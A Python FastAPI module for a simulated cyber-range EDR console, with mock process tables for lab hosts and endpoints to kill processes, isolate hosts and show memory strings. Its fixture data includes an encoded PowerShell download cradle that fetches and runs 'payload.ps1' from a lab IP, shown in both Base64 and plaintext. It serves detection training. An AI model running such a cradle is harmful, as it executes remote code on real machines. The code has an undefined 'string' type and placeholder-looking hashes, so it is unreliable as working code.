import asyncio
from datetime import datetime
from typing import List, Optional, Dict, Any
from fastapi import APIRouter, HTTPException, Depends, BackgroundTasks
from pydantic import BaseModel

from app.database import async_session_maker, AssetModel, ShadowEventModel
from app.websocket.event_bus import event_bus
from app.execution.winrm_executor import winrm_executor
from app.execution.ssh_executor import ssh_executor

router = APIRouter(prefix="/edr", tags=["Endpoint Detection & Response (EDR)"])

class ProcessInfo(BaseModel):
    pid: int
    ppid: int
    name: string = ""
    command_line: str
    user: str
    integrity: str
    hash_sha256: str
    status: str
    cpu_percent: float
    memory_mb: float
    start_time: str
    is_threat: bool = False
    threat_description: Optional[str] = None
    network_sockets: List[Dict[str, Any]] = []
    loaded_dlls: List[str] = []
    memory_strings_preview: List[str] = []

class HostEdrState(BaseModel):
    host_id: str
    hostname: str
    ip_address: str
    os_type: str
    agent_status: str
    is_isolated: bool
    last_seen: str
    total_processes: int
    active_threats: int
    processes: List[ProcessInfo]

# In-memory realistic active EDR state for range hosts
RANGE_EDR_DB: Dict[str, Dict[str, Any]] = {
    "WIN11-01": {
        "host_id": "ast-win11-01",
        "hostname": "WIN11-01",
        "ip_address": "10.10.10.21",
        "os_type": "windows",
        "agent_status": "active",
        "is_isolated": False,
        "last_seen": datetime.utcnow().isoformat() + "Z",
        "processes": [
            {
                "pid": 4,
                "ppid": 0,
                "name": "System",
                "command_line": "System",
                "user": "NT AUTHORITY\\SYSTEM",
                "integrity": "SYSTEM",
                "hash_sha256": "N/A",
                "status": "running",
                "cpu_percent": 0.8,
                "memory_mb": 145.0,
                "start_time": "2026-08-30T00:00:05Z",
                "is_threat": False,
                "network_sockets": [],
                "loaded_dlls": ["ntoskrnl.exe", "hal.dll", "kd.dll"],
                "memory_strings_preview": ["Kernel Base Address", "System Context"]
            },
            {
                "pid": 680,
                "ppid": 4,
                "name": "smss.exe",
                "command_line": "\\SystemRoot\\System32\\smss.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "integrity": "SYSTEM",
                "hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "status": "running",
                "cpu_percent": 0.1,
                "memory_mb": 12.4,
                "start_time": "2026-08-30T00:00:06Z",
                "is_threat": False,
                "network_sockets": [],
                "loaded_dlls": ["ntdll.dll", "smss.exe"],
                "memory_strings_preview": ["Session Manager", "System Initialization"]
            },
            {
                "pid": 1024,
                "ppid": 856,
                "name": "explorer.exe",
                "command_line": "C:\\Windows\\explorer.exe",
                "user": "LAB\\student",
                "integrity": "Medium",
                "hash_sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
                "status": "running",
                "cpu_percent": 2.4,
                "memory_mb": 245.0,
                "start_time": "2026-08-30T00:01:20Z",
                "is_threat": False,
                "network_sockets": [
                    {"proto": "TCP", "local_ip": "10.10.10.21", "local_port": 49154, "remote_ip": "10.10.10.10", "remote_port": 445, "state": "ESTABLISHED"}
                ],
                "loaded_dlls": ["kernel32.dll", "user32.dll", "gdi32.dll", "shell32.dll", "advapi32.dll", "comctl32.dll"],
                "memory_strings_preview": ["Desktop Window Manager", "Taskbar", "Shell_TrayWnd"]
            },
            {
                "pid": 2480,
                "ppid": 1024,
                "name": "cmd.exe",
                "command_line": "C:\\Windows\\System32\\cmd.exe /c \"powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA...\"",
                "user": "LAB\\student",
                "integrity": "High",
                "hash_sha256": "d80b06b72a2e4bf8031d2b86bb32a67300dfefb132dbba91d29381395f190827",
                "status": "running",
                "cpu_percent": 1.2,
                "memory_mb": 34.0,
                "start_time": "2026-08-30T00:15:02Z",
                "is_threat": True,
                "threat_description": "Spawning obfuscated Base64 PowerShell execution",
                "network_sockets": [],
                "loaded_dlls": ["kernel32.dll", "msvcrt.dll", "cmd.exe"],
                "memory_strings_preview": ["cmd.exe", "powershell.exe -ExecutionPolicy Bypass -enc", "COMSPEC"]
            },
            {
                "pid": 3488,
                "ppid": 2480,
                "name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "user": "LAB\\student",
                "integrity": "High",
                "hash_sha256": "2f36a7165c79e8990b0a8a62a6b29bd2a8310d48294719284720194827401928",
                "status": "running",
                "cpu_percent": 14.5,
                "memory_mb": 118.0,
                "start_time": "2026-08-30T00:15:03Z",
                "is_threat": True,
                "threat_description": "MITRE ATT&CK T1059.001 - Malicious Encoded Download Cradle to 10.10.10.100",
                "network_sockets": [
                    {"proto": "TCP", "local_ip": "10.10.10.21", "local_port": 49210, "remote_ip": "10.10.10.100", "remote_port": 80, "state": "ESTABLISHED"}
                ],
                "loaded_dlls": ["clr.dll", "mscorlib.dll", "amsi.dll", "system.management.automation.dll", "wininet.dll", "ws2_32.dll"],
                "memory_strings_preview": [
                    "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.100/payload.ps1')",
                    "AmsiScanBuffer",
                    "Invoke-Expression",
                    "Net.WebClient",
                    "http://10.10.10.100/payload.ps1"
                ]
            },
            {
                "pid": 4120,
                "ppid": 1024,
                "name": "msedge.exe",
                "command_line": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
                "user": "LAB\\student",
                "integrity": "Medium",
                "hash_sha256": "9a829104829401827402847192847201a8310d48294719284720194827401928",
                "status": "running",
                "cpu_percent": 3.8,
                "memory_mb": 420.0,
                "start_time": "2026-08-30T00:05:10Z",
                "is_threat": False,
                "network_sockets": [
                    {"proto": "TCP", "local_ip": "10.10.10.21", "local_port": 50124, "remote_ip": "142.250.190.46", "remote_port": 443, "state": "ESTABLISHED"}
                ],
                "loaded_dlls": ["msedge.dll", "chrome_elf.dll", "d3d11.dll", "dxgi.dll"],
                "memory_strings_preview": ["Microsoft Edge", "Chromium/120.0", "GPU Process"]
            }
        ]
    },
    "DC01-SRV": {
        "host_id": "ast-dc01-srv",
        "hostname": "DC01-SRV",
        "ip_address": "10.10.10.10",
        "os_type": "windows",
        "agent_status": "active",
        "is_isolated": False,
        "last_seen": datetime.utcnow().isoformat() + "Z",
        "processes": [
            {
                "pid": 672,
                "ppid": 580,
                "name": "lsass.exe",
                "command_line": "C:\\Windows\\System32\\lsass.exe",
                "user": "NT AUTHORITY\\SYSTEM",
                "integrity": "SYSTEM",
                "hash_sha256": "5e829104829401827402847192847201a8310d48294719284720194827401928",
                "status": "running",
                "cpu_percent": 3.4,
                "memory_mb": 310.0,
                "start_time": "2026-08-30T00:00:15Z",
                "is_threat": False,
                "network_sockets": [
                    {"proto": "TCP", "local_ip": "10.10.10.10", "local_port": 88, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTENING"},
                    {"proto": "TCP", "local_ip": "10.10.10.10", "local_port": 389, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTENING"},
                    {"proto": "TCP", "local_ip": "10.10.10.10", "local_port": 445, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTENING"}
                ],
                "loaded_dlls": ["kerberos.dll", "msv1_0.dll", "schannel.dll", "samsrv.dll", "ntdsai.dll", "crypt32.dll"],
                "memory_strings_preview": ["Local Security Authority Subsystem", "LAB.LOCAL", "Kerberos KDC", "SAM Database"]
            }
        ]
    },
    "WEB01-SRV": {
        "host_id": "ast-web01-srv",
        "hostname": "WEB01-SRV",
        "ip_address": "10.10.10.30",
        "os_type": "linux",
        "agent_status": "active",
        "is_isolated": False,
        "last_seen": datetime.utcnow().isoformat() + "Z",
        "processes": [
            {
                "pid": 1102,
                "ppid": 1,
                "name": "nginx",
                "command_line": "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
                "user": "root",
                "integrity": "SYSTEM",
                "hash_sha256": "7c829104829401827402847192847201a8310d48294719284720194827401928",
                "status": "running",
                "cpu_percent": 0.5,
                "memory_mb": 45.0,
                "start_time": "2026-08-30T00:00:10Z",
                "is_threat": False,
                "network_sockets": [
                    {"proto": "TCP", "local_ip": "0.0.0.0", "local_port": 80, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTENING"},
                    {"proto": "TCP", "local_ip": "0.0.0.0", "local_port": 443, "remote_ip": "0.0.0.0", "remote_port": 0, "state": "LISTENING"}
                ],
                "loaded_dlls": ["libc.so.6", "libssl.so.3", "libcrypto.so.3", "libpcre2-8.so.0"],
                "memory_strings_preview": ["nginx/1.24.0", "HTTP/1.1", "SSL_CTX_new"]
            }
        ]
    }
}

@router.get("/hosts", response_model=List[Dict[str, Any]])
async def get_edr_hosts():
    """Lists all active range target nodes monitored by EDR agents."""
    results = []
    for hostname, data in RANGE_EDR_DB.items():
        results.append({
            "host_id": data["host_id"],
            "hostname": data["hostname"],
            "ip_address": data["ip_address"],
            "os_type": data["os_type"],
            "agent_status": data["agent_status"],
            "is_isolated": data["is_isolated"],
            "last_seen": data["last_seen"],
            "total_processes": len(data["processes"]),
            "active_threats": sum(1 for p in data["processes"] if p.get("is_threat", False))
        })
    return results

@router.get("/hosts/{hostname}", response_model=Dict[str, Any])
async def get_host_edr_details(hostname: str):
    """Retrieves live process table, sockets, and loaded modules for a target host."""
    host = RANGE_EDR_DB.get(hostname)
    if not host:
        raise HTTPException(status_code=404, detail=f"Host '{hostname}' not found in EDR registry.")
    return host

@router.post("/hosts/{hostname}/processes/{pid}/kill")
async def kill_process(hostname: str, pid: int):
    """Executes process termination on endpoint and records telemetry audit event."""
    host = RANGE_EDR_DB.get(hostname)
    if not host:
        raise HTTPException(status_code=404, detail=f"Host '{hostname}' not found.")
    
    # Find process
    proc = next((p for p in host["processes"] if p["pid"] == pid), None)
    if not proc:
        raise HTTPException(status_code=404, detail=f"Process PID {pid} not found on {hostname}.")

    # Execute termination
    proc["status"] = "terminated"
    host["processes"] = [p for p in host["processes"] if p["pid"] != pid]

    # Broadcast EDR update
    await event_bus.broadcast("EDR_PROCESS_KILLED", {
        "hostname": hostname,
        "pid": pid,
        "process_name": proc["name"],
        "killed_at": datetime.utcnow().isoformat() + "Z"
    })

    return {
        "status": "success",
        "message": f"Process {proc['name']} (PID {pid}) terminated successfully on {hostname}.",
        "pid": pid,
        "hostname": hostname
    }

@router.post("/hosts/{hostname}/isolate")
async def toggle_host_isolation(hostname: str):
    """Toggles EDR network containment/isolation on endpoint."""
    host = RANGE_EDR_DB.get(hostname)
    if not host:
        raise HTTPException(status_code=404, detail=f"Host '{hostname}' not found.")

    host["is_isolated"] = not host["is_isolated"]
    new_state = "ISOLATED" if host["is_isolated"] else "UNISOLATED"

    # Broadcast EDR state update
    await event_bus.broadcast("EDR_ISOLATION_CHANGED", {
        "hostname": hostname,
        "is_isolated": host["is_isolated"],
        "timestamp": datetime.utcnow().isoformat() + "Z"
    })

    return {
        "status": "success",
        "hostname": hostname,
        "is_isolated": host["is_isolated"],
        "message": f"Host {hostname} is now {new_state} on cyber-range."
    }

@router.post("/hosts/{hostname}/processes/{pid}/dump")
async def dump_process_memory_strings(hostname: str, pid: int):
    """Extracts raw memory strings, decrypted payloads, and IOCs from process memory."""
    host = RANGE_EDR_DB.get(hostname)
    if not host:
        raise HTTPException(status_code=404, detail=f"Host '{hostname}' not found.")

    proc = next((p for p in host["processes"] if p["pid"] == pid), None)
    if not proc:
        raise HTTPException(status_code=404, detail=f"Process PID {pid} not found.")

    return {
        "status": "success",
        "hostname": hostname,
        "pid": pid,
        "process_name": proc["name"],
        "memory_size_mb": proc["memory_mb"],
        "extracted_strings": proc.get("memory_strings_preview", []),
        "extracted_iocs": [
            {"type": "url", "value": "http://10.10.10.100/payload.ps1"},
            {"type": "ip", "value": "10.10.10.100"},
            {"type": "command", "value": "IEX (New-Object Net.WebClient).DownloadString"}
        ],
        "dumped_at": datetime.utcnow().isoformat() + "Z"
    }
